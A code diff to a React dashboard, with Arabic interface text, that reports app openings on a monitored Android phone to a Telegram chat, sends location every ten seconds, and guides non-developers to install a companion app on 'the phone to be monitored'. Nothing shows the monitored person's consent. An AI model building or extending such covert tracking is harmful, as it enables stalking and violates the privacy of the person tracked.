@@ -123,6 +123,47 @@ export default function App() {
   const [locationPermission, setLocationPermission] = useState<PermissionState>('prompt');
   const [isLiveTracking, setIsLiveTracking] = useState(false);
   const [lastSentLocation, setLastSentLocation] = useState<string | null>(null);
+  const [lastNotifiedLogId, setLastNotifiedLogId] = useState<string | null>(null);
+  const [botStatus, setBotStatus] = useState<{ active: boolean, hasToken: boolean }>({ active: false, hasToken: false });
+
+  // Check bot status
+  useEffect(() => {
+    const checkBot = async () => {
+      try {
+        const res = await fetch('/api/health');
+        const data = await res.json();
+        setBotStatus({ active: data.botActive, hasToken: data.hasToken });
+      } catch (e) {
+        setBotStatus({ active: false, hasToken: false });
+      }
+    };
+    checkBot();
+    const interval = setInterval(checkBot, 30000);
+    return () => clearInterval(interval);
+  }, []);
+
+  // Send Telegram notification for NEW logs (Real or Simulated)
+  useEffect(() => {
+    if (logs.length > 0 && config.notificationsEnabled && config.telegramChatId) {
+      const latestLog = logs[0];
+      
+      // Only notify if it's a new log we haven't processed yet
+      if (latestLog.id !== lastNotifiedLogId) {
+        setLastNotifiedLogId(latestLog.id);
+        
+        if (latestLog.status === 'active') {
+          fetch('/api/notify', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              chatId: config.telegramChatId,
+              message: `🚀 نشاط جديد: تم فتح تطبيق ${latestLog.appName} (${latestLog.packageName})\nالوقت: ${format(latestLog.startTime.toDate(), 'HH:mm:ss')}`
+            })
+          });
+        }
+      }
+    }
+  }, [logs, config.notificationsEnabled, config.telegramChatId, lastNotifiedLogId]);
 
   // Send location to Telegram every 10s if tracking is on
   useEffect(() => {
@@ -275,18 +316,6 @@ export default function App() {
       status: 'active'
     });
 
-    // Send Telegram Notification via Server
-    if (config.telegramChatId && config.notificationsEnabled) {
-      fetch('/api/notify', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chatId: config.telegramChatId,
-          message: `🚀 تم الدخول إلى التطبيق: ${app.name}\nالوقت: ${format(new Date(), 'HH:mm:ss')}`
-        })
-      });
-    }
-
     // Auto-complete after 5 seconds for demo
     setTimeout(async () => {
       const endTime = new Date();
@@ -296,18 +325,32 @@ export default function App() {
         duration,
         status: 'completed'
       });
-
-      if (config.telegramChatId && config.notificationsEnabled) {
-        fetch('/api/notify', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            chatId: config.telegramChatId,
-            message: `🏁 تم الخروج من: ${app.name}\nمدة البقاء: ${duration} ثواني`
-          })
-        });
-      }
     }, 5000);
+  };
+
+  const testTelegram = async () => {
+    if (!config.telegramChatId) {
+      alert("يرجى إدخال Chat ID أولاً");
+      return;
+    }
+    try {
+      const res = await fetch('/api/notify', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chatId: config.telegramChatId,
+          message: "🔔 اختبار ناجح! بوت تيليجرام متصل بلوحة التحكم الخاصة بك."
+        })
+      });
+      const data = await res.json();
+      if (data.success) {
+        alert("تم إرسال رسالة الاختبار بنجاح!");
+      } else {
+        alert("فشل الإرسال: " + data.error);
+      }
+    } catch (e) {
+      alert("خطأ في الاتصال بالسيرفر");
+    }
   };
 
   if (loading) {
@@ -599,7 +642,15 @@ export default function App() {
               <Card className="p-6 space-y-6">
                 <div className="space-y-4">
                   <label className="block">
-                    <span className="text-sm font-bold text-slate-700 mb-2 block">معرف دردشة تيليجرام (Chat ID)</span>
+                    <span className="text-sm font-bold text-slate-700 mb-2 flex items-center justify-between">
+                      معرف دردشة تيليجرام (Chat ID)
+                      <span className={cn(
+                        "text-[10px] px-2 py-0.5 rounded-full font-medium",
+                        botStatus.active ? "bg-green-100 text-green-600" : "bg-rose-100 text-rose-600"
+                      )}>
+                        {botStatus.active ? "البوت متصل" : botStatus.hasToken ? "البوت غير نشط (تحقق من التوكن)" : "التوكن مفقود"}
+                      </span>
+                    </span>
                     <div className="flex gap-2">
                       <input 
                         type="text" 
@@ -608,6 +659,9 @@ export default function App() {
                         placeholder="أدخل Chat ID الخاص بك"
                         className="flex-1 bg-slate-50 border border-slate-200 rounded-xl px-4 py-2 focus:ring-2 focus:ring-indigo-500 outline-none"
                       />
+                      <Button onClick={testTelegram} variant="secondary">
+                        اختبار الاتصال
+                      </Button>
                       <Button onClick={() => window.open('https://t.me/userinfobot', '_blank')} variant="secondary">
                         احصل على ID
                       </Button>
@@ -673,8 +727,15 @@ export default function App() {
                 </div>
 
                 <div className="pt-6 border-t border-slate-100">
-                  <h4 className="font-bold text-sm mb-4">دليل ربط تطبيق الأندرويد (لغير المطورين):</h4>
+                  <h4 className="font-bold text-sm mb-4 text-indigo-600">كيف تجعل المراقبة "حقيقية" وليست وهمية؟</h4>
                   <div className="space-y-4">
+                    <div className="bg-indigo-50 p-4 rounded-xl border border-indigo-100">
+                      <p className="text-sm text-indigo-900 leading-relaxed font-medium">
+                        لوحة التحكم هذه هي مجرد "عارض" للبيانات. لكي تعمل المراقبة بشكل حقيقي، يجب عليك تثبيت تطبيق على هاتف الأندرويد المراد مراقبته.
+                      </p>
+                    </div>
+
+                    <h4 className="font-bold text-sm mt-6">دليل ربط تطبيق الأندرويد (للمستخدمين):</h4>
                     <p className="text-sm text-slate-600 leading-relaxed">
                       بما أنك لست مطوراً، يمكنك استخدام هذه التعليمات البرمجية الجاهزة. ستحتاج إلى إنشاء مشروع أندرويد في Android Studio وإضافة ملف <code className="bg-slate-100 px-1 rounded">google-services.json</code> الخاص بمشروع Firebase الخاص بك.
                     </p>
